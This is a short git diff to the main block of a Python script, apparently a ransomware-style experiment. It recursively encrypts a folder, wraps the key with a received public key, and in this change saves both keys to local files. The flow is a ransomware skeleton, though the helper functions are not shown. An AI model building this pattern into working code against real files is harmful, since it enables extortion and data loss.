@@ -112,8 +112,20 @@ if __name__ == "__main__":
     # Encrypt an entire folder and its subfolders
     folder_to_encrypt = 'random'
     encrypt_folder_recursive(key_original, folder_to_encrypt)
+    # save the key to a file
+    # Get the user's desktop folder path
+    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
+
+    # Create the full file path on the desktop
+    file_path = os.path.join(desktop_path, 'key.key')
+    with open(file_path, 'wb') as f:
+        f.write(key_original)
 
     public_key = receive_public_key()
+    # save the key to a file
+    with open('public_key.pem', 'wb') as f:
+        f.write(public_key.encode('utf-8'))
+    
     key_encrypted = encrypt_key(key_original, public_key)
 
     print("Encrypted key:", key_encrypted)
